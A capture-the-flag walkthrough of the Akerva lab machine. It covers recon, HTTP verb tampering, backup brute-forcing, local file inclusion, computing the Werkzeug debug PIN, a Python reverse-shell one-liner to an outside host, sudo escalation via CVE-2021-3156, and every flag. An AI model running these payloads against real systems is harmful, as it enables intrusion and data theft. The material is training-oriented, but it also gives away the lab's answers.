# Akerva

:::note ABOUT Akerva

Pure player in cybersecurity with strong expertise (Technical Expertise, Audit and Pentest, Red Team operations, SSI Governance, E-learning, SOC ...), Akerva is an independent firm which today has around sixty employees.

Our consultants and auditors are involved in high added value advisory and audit assignments on complex security issues.

In strong growth, we are recruiting many consultants with a technical profile to integrate our audit team but also our SOC - Cyber â€‹â€‹Defense Center. We are also looking for consultants with a real consulting approach to carry out ISS Governance, risk analysis or security project management missions.

Our technical teams, specialized in offensive security, intervene in penetration testing and audit services in order to maximize the security of our customers' Information Systems. Via our Security Lab, our auditors are able to focus analysis as close as possible to real conditions and to improve their skills on a regular basis.

Whatever their profile, our employees are all supported in the passage of recognized training and certification corresponding to their expectations (OSCP / OSCE, ISO 27001, ISO 27005, CeH, PCI-DSS, etc.).

Whatever the duration of your journey within our teams, this experience will mark your career!

Every day, we make sure that your career wishes are in line with our ability to support you. We offer training and / or ISS certifications to enhance or develop your expertise. We are committed to your work / life balance by offering assignments near your home. Each newcomer is supported and welcomed by a sponsor during their integration. We offer an attractive co-optation program so that you are directly involved in the growth of Akerva.

And finally, we regularly organize afterworks, rumps and events with all our teams to disconnect but also extend our cyber skills!

Follow us: `https://twitter.com/akerva_fr`

Akerva æ˜¯ç½‘ç»œå®‰å…¨é¢†åŸŸçš„ä¸“ä¸šå…¬å¸ï¼Œæ‹¥æœ‰å¼ºå¤§çš„ä¸“ä¸šçŸ¥è¯†ï¼ˆæŠ€æœ¯ä¸“ä¸šçŸ¥è¯†ã€å®¡è®¡å’Œæ¸—é€æµ‹è¯•ã€çº¢é˜Ÿè¡ŒåŠ¨ã€SSI æ²»ç†ã€ç”µå­å­¦ä¹ ã€SOC ç­‰ï¼‰ï¼Œæ˜¯ä¸€å®¶ç‹¬ç«‹å…¬å¸ï¼Œå¦‚ä»Šæ‹¥æœ‰çº¦å…­ååå‘˜å·¥ã€‚

æˆ‘ä»¬çš„é¡¾é—®å’Œå®¡è®¡å¸ˆå‚ä¸äº†æœ‰å…³å¤æ‚å®‰å…¨é—®é¢˜çš„å¢å€¼å’¨è¯¢å’Œå®¡è®¡ä»»åŠ¡ã€‚

åœ¨å¼ºåŠ²å¢é•¿çš„æ¨åŠ¨ä¸‹ï¼Œæˆ‘ä»¬æ­£åœ¨æ‹›è˜è®¸å¤šå…·æœ‰æŠ€æœ¯èƒŒæ™¯çš„é¡¾é—®ï¼Œä»¥åŠ å…¥æˆ‘ä»¬çš„å®¡è®¡å›¢é˜Ÿä»¥åŠæˆ‘ä»¬çš„ SOC - ç½‘ç»œé˜²å¾¡ä¸­å¿ƒã€‚æˆ‘ä»¬è¿˜åœ¨å¯»æ‰¾å…·æœ‰çœŸæ­£çš„å’¨è¯¢æ–¹æ³•çš„é¡¾é—®ï¼Œä»¥æ‰§è¡Œ ISS æ²»ç†ã€é£é™©åˆ†ææˆ–å®‰å…¨é¡¹ç›®ç®¡ç†ä»»åŠ¡ã€‚

æˆ‘ä»¬çš„æŠ€æœ¯å›¢é˜Ÿä¸“é—¨ä»äº‹è¿›æ”»æ€§å®‰å…¨ï¼Œå‚ä¸æ¸—é€æµ‹è¯•å’Œå®¡è®¡æœåŠ¡ï¼Œä»¥æœ€å¤§ç¨‹åº¦åœ°æé«˜æˆ‘ä»¬å®¢æˆ·çš„ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚é€šè¿‡æˆ‘ä»¬çš„å®‰å…¨å®éªŒå®¤ï¼Œæˆ‘ä»¬çš„å®¡è®¡å¸ˆèƒ½å¤Ÿå°½å¯èƒ½æ¥è¿‘çœŸå®æ¡ä»¶åœ°è¿›è¡Œåˆ†æï¼Œå¹¶å®šæœŸæé«˜è‡ªå·±çš„æŠ€èƒ½ã€‚

æ— è®ºä»–ä»¬çš„èƒŒæ™¯å¦‚ä½•ï¼Œæˆ‘ä»¬éƒ½ä¼šæ”¯æŒæˆ‘ä»¬çš„å‘˜å·¥é€šè¿‡ä¸ä»–ä»¬çš„æœŸæœ›ç›¸ç¬¦çš„å…¬è®¤åŸ¹è®­å’Œè®¤è¯ï¼ˆOSCP/OSCEã€ISO 27001ã€ISO 27005ã€CeHã€PCI-DSS ç­‰ï¼‰ã€‚

æ— è®ºæ‚¨åœ¨æˆ‘ä»¬å›¢é˜Ÿä¸­çš„å·¥ä½œæ—¶é—´é•¿çŸ­ï¼Œè¿™æ®µç»å†éƒ½å°†æˆä¸ºæ‚¨èŒä¸šç”Ÿæ¶¯ä¸­æµ“å¢¨é‡å½©çš„ä¸€ç¬”ï¼

æ¯å¤©ï¼Œæˆ‘ä»¬éƒ½ç¡®ä¿æ‚¨çš„èŒä¸šæ„¿æœ›ä¸æˆ‘ä»¬æ”¯æŒæ‚¨çš„èƒ½åŠ›ç›¸ç¬¦ã€‚æˆ‘ä»¬æä¾›åŸ¹è®­å’Œ / æˆ– ISS è®¤è¯ä»¥å¢å¼ºæˆ–å‘å±•æ‚¨çš„ä¸“ä¸šçŸ¥è¯†ã€‚æˆ‘ä»¬é€šè¿‡æä¾›é è¿‘æ‚¨å®¶çš„ä»»åŠ¡æ¥è‡´åŠ›äºæ‚¨çš„å·¥ä½œ / ç”Ÿæ´»å¹³è¡¡ã€‚æ¯ä½æ–°äººéƒ½å°†åœ¨èå…¥æœŸé—´å¾—åˆ°ä¸€ä½èµåŠ©äººçš„æ”¯æŒå’Œæ¬¢è¿ã€‚æˆ‘ä»¬æä¾›äº†ä¸€é¡¹æœ‰å¸å¼•åŠ›çš„åˆä½œè®¡åˆ’ï¼Œä»¥ä¾¿æ‚¨ç›´æ¥å‚ä¸ Akerva çš„å‘å±•ã€‚

æœ€åï¼Œæˆ‘ä»¬å®šæœŸä¸æˆ‘ä»¬æ‰€æœ‰çš„å›¢é˜Ÿç»„ç»‡ä¸‹ç­èšä¼šã€é—²èŠå’Œæ´»åŠ¨ï¼Œä»¥æ”¾æ¾ä¸€ä¸‹ï¼ŒåŒæ—¶è¿˜å¯ä»¥æ‰©å±•æˆ‘ä»¬çš„ç½‘ç»œæŠ€èƒ½ï¼

å…³æ³¨æˆ‘ä»¬ï¼š`https://twitter.com/akerva_fr`

:::

## ENTRY POINT

```plaintext
10.13.37.11
```

## First of all

```plaintext title="rustscan --ulimit 5000 10.13.37.11"
Open 10.13.37.11:22
Open 10.13.37.11:80
Open 10.13.37.11:5000
```

```shell title="sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 10.13.37.11"
PORT      STATE         SERVICE      VERSION
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-win32-software:
|_  ......
| snmp-netstat:
|
|_  ......
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 138.67 Mb sent, 138.67 Mb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.13.37.11  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:71:c8 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 3.73 Gb sent, 1.79 Gb received
| snmp-processes:
|_  ......
| snmp-sysdescr: Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64
|_  System uptime: 7d22h42m45.35s (68656535 timeticks)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 423f5e76cd7abe5e00000000
|   snmpEngineBoots: 6
|_  snmpEngineTime: 7d22h42m45s
```

```plaintext title="sudo nmap -A --min-rate=5000 -T4 -p 22,80,5000 10.13.37.11"
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)
|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)
|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.4-alpha-47225
|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
| http-auth:
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Authentication Required
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
```

```plaintext title="wpscan --url 10.13.37.11"
[+] URL: http://10.13.37.11/ [10.13.37.11]
[+] Started: Wed Mar  6 23:25:10 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.13.37.11/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.13.37.11/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.13.37.11/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.13.37.11/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.13.37.11/, Match: 'WordPress 5.4'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.13.37.11/wp-content/themes/twentyfifteen/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: http://10.13.37.11/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.6
 | Style URL: http://10.13.37.11/wp-content/themes/twentyfifteen/style.css?ver=20190507
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.13.37.11/wp-content/themes/twentyfifteen/style.css?ver=20190507, Match: 'Version: 2.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:16 <=================================================================================================================================> (137 / 137) 100.00% Time: 00:00:16

[i] No Config Backups Found.
```

## Introduction

```plaintext
This fun fortress from Akerva features a gradual learning curve. It teaches about common developer mistakes while also introducing a very interesting web vector. Prepare to take your skills to the next level!

è¿™æ¬¾æ¥è‡ª Akerva çš„æœ‰è¶£å ¡å’å…·æœ‰é€æ¸å­¦ä¹ çš„æ›²çº¿ã€‚å®ƒåœ¨ä»‹ç»ä¸€ä¸ªéå¸¸æœ‰è¶£çš„ç½‘ç»œå‘é‡çš„åŒæ—¶ï¼Œè¿˜æ•™æˆå¸¸è§çš„å¼€å‘äººå‘˜é”™è¯¯ã€‚å‡†å¤‡å°†ä½ çš„æŠ€èƒ½æå‡åˆ°ä¸€ä¸ªæ–°çš„æ°´å¹³ï¼
```

## Plain Sight

```html title="http get http://10.13.37.11/"
......
<!-- Hello folks! -->
<!-- This machine is powered by @lydericlefebvre from Akerva company. -->
<!-- You have to find 8 flags on this machine. Have a nice root! -->
<!-- By the way, the first flag is: AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts} -->
```

```plaintext title="Flag"
AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}
```

## Take a Look Around

åœ¨ udp æ‰«æç»“æœä¸­å‘ç°äº† snmp æœåŠ¡ï¼Œè¿›è¡Œæ¢æµ‹

```plaintext title='snmpbulkwalk -c public -v2c 10.13.37.11 | grep"AKERVA"'
iso.3.6.1.2.1.25.4.2.1.5.1243 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}"
```

```plaintext title="Flag"
AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
```

## Dead Poets

åœ¨ä¸Šä¸€é¢˜ä¸­ï¼Œæ³¨æ„åˆ° `/var/www/html/scripts/backup_every_17minutes.sh`

æ ¹æ®è·¯å¾„ï¼Œå¯ä»¥å®šä½åˆ° `http://10.13.37.11/scripts/backup_every_17minutes.sh`

å°è¯•ç›´æ¥ `GET`

```html title="http get http://10.13.37.11/scripts/backup_every_17minutes.sh"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.13.37.11 Port 80</address>
</body></html>
```

å°è¯•æ›´æ¢å…¶ä»–åè®®è¿›è¡Œè¯·æ±‚ï¼Œæ¯”å¦‚ `POST`

```shell title="http post http://10.13.37.11/scripts/backup_every_17minutes.sh"
#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IKNoW###VeRbTamper!nG_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
        ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
        echo "Erasing old backups..."
        rm -rf $SAVE_DIR/*

        echo "Backuping..."
        zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

        echo "Done..."
        sleep 1020
done
```

```plaintext title="Flag
AKERVA{IKNoW###VeRbTamper!nG_==}
```

## Now You See Me

æ ¹æ® `sleep 1020` è¿™å¥å¯ä»¥åˆ¤æ–­ï¼Œè¿™ä¸ªè„šæœ¬æ˜¯æ¯éš” 17 åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡

å°è¯•è¿›è¡Œçˆ†ç ´æ–‡ä»¶å

é¦–å…ˆï¼Œå…ˆç¡®å®šæœåŠ¡å™¨æ—¶é—´

```plaintext title="curl -s 10.13.37.11 -I | grep Date"
Date: Wed, 06 Mar 2024 16:07:01 GMT
```

ç”±äºå½“å‰æœåŠ¡å™¨æ—¶é—´ä¸º `16:07:01` æ—¶é—´ï¼Œæ‰€ä»¥é‡‡ç”¨ `2024030615` ä½œä¸ºæ–‡ä»¶å‰ç¼€

ç„¶åå¼€å§‹çˆ†ç ´

```shell title="ffuf -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://10.13.37.11/backups/backup_2024030615FUZZ.zip"
[Status: 200, Size: 22071775, Words: 0, Lines: 0, Duration: 0ms]
    * FUZZ: 5716
```

å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥

```shell
wget http://10.13.37.11/backups/backup_20240306155716.zip
```

å°†å‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œåœ¨ `var/www/html/dev/space_dev.py` ä¸­å¾—åˆ°

```python
users = {
        "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
        }
```

```plaintext title="Flag"
AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
```

## Open Book

åœ¨ä¸Šé¢å¾—åˆ°çš„è„šæœ¬ä¸­ï¼Œå¯ä»¥æ³¨æ„åˆ°ä»¥ä¸‹ä¿¡æ¯

```python
users = {
        "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
        }
if __name__ == '__main__':
    print(app)
    print(getattr(app, '__name__', getattr(app.__class__, '__name__')))
    app.run(host='0.0.0.0', port='5000', debug = True)
```

å°è¯•ä»¥

```plaintext
username: aas
password: AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
```

ä½œä¸ºå‡­æ®è¿›è¡Œè®¿é—®

![img](img/image_20240306-000651.png)

æ ¹æ®åœ¨æºç ä¸­å¾—åˆ°çš„è·¯ç”±ä¿¡æ¯

```python
@app.route("/file")
@auth.login_required
def file():
    filename = request.args.get('filename')
    try:
        with open(filename, 'r') as f:
            return f.read()
    except:
        return 'error'
```

è®¿é—® `http://10.13.37.11:5000/file?filename=/etc/passwd`

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
```

è¯æ˜å¯ä»¥å®ç°æ–‡ä»¶è¯»å–

åœ¨ `/etc/passwd` ä¸­ï¼Œæ³¨æ„åˆ°è¿™æ¡è®°å½•

```plaintext
aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash
```

å°è¯•è¯»å– `flag.txt` æ–‡ä»¶

```plaintext title="http://10.13.37.11:5000/file?filename=/home/aas/flag.txt"
AKERVA{IKNOW#LFi_@_}
```

```plaintext title="Flag
AKERVA{IKNOW#LFi_@_}
```

## Say Friend and Enter

åœ¨ nmap æ‰«æç»“æœä¸­ï¼Œæ³¨æ„åˆ°

```plaintext
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
| http-auth:
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Authentication Required
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
```

å¹¶ä¸”åœ¨ python æºç ä¸­æ³¨æ„åˆ°

```python
if __name__ == '__main__':
    print(app)
    print(getattr(app, '__name__', getattr(app.__class__, '__name__')))
    app.run(host='0.0.0.0', port='5000', debug = True)
```

æœåŠ¡å¼€å¯äº† debug æ¨¡å¼ï¼Œä¹Ÿå°±è¯´æ˜å­˜åœ¨ `/console` è·¯ç”±

![img](img/image_20240315-001500.png)

æ ¹æ®ç›®å‰å·²ç»å¾—åˆ°çš„ä¿¡æ¯

```plaintext
username: ass
Werkzeug/0.16.0 Python/2.7.15+
```

åŒæ—¶å€ŸåŠ©ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–ç¯å¢ƒä¿¡æ¯

```plaintext title="http://10.13.37.11:5000/file?filename=/sys/class/net/ens33/address"
00:50:56:b9:71:c8
```

```plaintext title="http://10.13.37.11:5000/file?filename=/etc/machine-id"
258f132cd7e647caaf5510e3aca997c1
```

ç„¶åé€šè¿‡ `Werkzeug 0.16.0` æºç ä¸­ï¼Œå…³äº Debug Console Code çš„è®¡ç®—éƒ¨åˆ†ï¼Œç¼–å†™è®¡ç®—è„šæœ¬

```python
import hashlib
from itertools import chain

probably_public_bits = [
    "aas",  # username
    "flask.app",  # modname
    "Flask",  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    "/usr/local/lib/python2.7/dist-packages/flask/app.pyc",  # getattr(mod, '__file__', None),
]

private_bits = [
    str(int("00:50:56:b9:71:c8".replace(":", ""), 16)),  # str(uuid.getnode()),  /sys/class/net/ens33/address
    "258f132cd7e647caaf5510e3aca997c1",  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
# h.update(b'shittysalt')

cookie_name = "__wzd" + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(num[x : x + group_size].rjust(group_size, "0") for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
# 144-177-687
```

ä½¿ç”¨ `144-177-687` è®¿é—® Debug Console

![img](img/image_20240322-002205.png)

ä½¿ç”¨ Debug Console åå¼¹ shell

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

æˆåŠŸæ”¶åˆ°å›è¿çš„ shell

```shell
â”Œâ”€[randark@parrot]â”€[~/tmp]
â””â”€â”€â•¼ $ pwncat-cs -lp 9999
[00:24:58] Welcome to pwncat ğŸˆ!
[00:25:16] received connection from 10.13.37.11:37272
[00:25:25] 10.13.37.11:37272: registered new host w/ db
(local) pwncat$ back
(remote) aas@Leakage:/home/aas$ whoami
aas
```

åˆ—å‡ºç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶

```shell
(remote) aas@Leakage:/home/aas$ ls -lah
total 28K
drwxr-xr-x 3 aas  aas  4.0K Feb  9  2020 .
drwxr-xr-x 3 root root 4.0K Feb  9  2020 ..
-rw------- 1 root root    0 Dec  7  2019 .bash_history
-rw-r--r-- 1 aas  aas   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aas  aas  3.7K Apr  4  2018 .bashrc
-r-------- 1 aas  aas    21 Feb  9  2020 flag.txt
-rw-r--r-- 1 root root   38 Feb  9  2020 .hiddenflag.txt
dr-xr-x--- 2 aas  aas  4.0K Feb 10  2020 .ssh
(remote) aas@Leakage:/home/aas$ cat .hiddenflag.txt
AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
```

```plaintext title="Flag
AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
```

## Super Mushroom

æ¢æµ‹ç¯å¢ƒä¸­ï¼Œæ³¨æ„åˆ° `sudo` çš„ç‰ˆæœ¬ä¿¡æ¯

```shell
(remote) aas@Leakage:/home/aas$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

æŸ¥è¯¢æ¼æ´åº“ä¹‹åï¼Œå®šä½åˆ° `CVE-2021-3156`

ä½¿ç”¨ [CVE-2021-3156/exploit_nss.py at main Â· worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py) è¿›è¡Œæ”»å‡»

```shell
(remote) aas@Leakage:/tmp$ ./exploit
[sudo] password for aas:
There's a lot of it about, you know.
(remote) root@Leakage:/tmp$ whoami
root
```

åœ¨ `/root` ç›®å½•ä¸­ï¼Œåˆ—å‡ºæ–‡ä»¶å¤¹ä¿¡æ¯

```shell
(remote) root@Leakage:/root# ls -lh
total 8.0K
-rw-r--r-- 1 root root  26 Feb  9  2020 flag.txt
-r-------- 1 root root 206 Feb  9  2020 secured_note.md
(remote) root@Leakage:/root# cat flag.txt
AKERVA{IkNow_Sud0_sUckS!}
```

```plaintext title="Flag"
AKERVA{IkNow_Sud0_sUckS!}
```

## Little Secret

```plaintext title="/root/secured_note.md"
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
U1BNSUhITU9EQVVLSEUK

@AKERVA_FR | @lydericlefebvre
```

åœ¨æ–‡ä»¶çš„å‰åŠéƒ¨åˆ†ï¼Œå¾—åˆ°

```plaintext
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK
```

Base64 Decode ä¹‹åï¼Œå¾—åˆ°

```plaintext
GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
```

å°è¯•åŸºäºç»´å‰å°¼äºšè¿›è¡Œè§£å¯† [Vigenere Cipher - Online Decoder, Encoder, Solver, Translator](https://www.dcode.fr/vigenere-cipher)

é¦–å…ˆï¼Œå¯ä»¥çŒœæµ‹æ˜æ–‡ä¸­åŒ…å«æœ‰ `AKERVA`

å…¶æ¬¡ï¼Œæ³¨æ„åˆ°ä¿¡æ¯ä¸­æ²¡æœ‰ `B,J,Q,X,Z` å­—æ¯ï¼Œæ‰€ä»¥ä»å­—æ¯è¡¨ä¸­åˆ å»

```plaintext
ACDEFGHIKLMNOPRSTUVWY
```

å°è¯•è§£å¯†ï¼Œå¹¶å¾—åˆ°çœ‹èµ·æ¥æœ€åˆç†çš„ä¸€æ¡

|  password  |                                                             message                                                              |
| :--------: | :------------------------------------------------------------------------------------------------------------------------------: |
| ILOVESPACE | WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE |

å°† message è¿›è¡Œè¿˜åŸ

```plaintext
WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE
welldoneforsolvingthischallengeyoucansendyourresumehereatrecrutementakervacomandvalidatethelastflagwithakervaiknooowvigeeenerrre

well done for solving this challenge you can send your resume here at recrutement akerva com
and validate the last flag with akerva iknooowvigeeenerrre
```

```plaintext title="Flag"
AKERVA{iknooowvigeeenerrre}
```
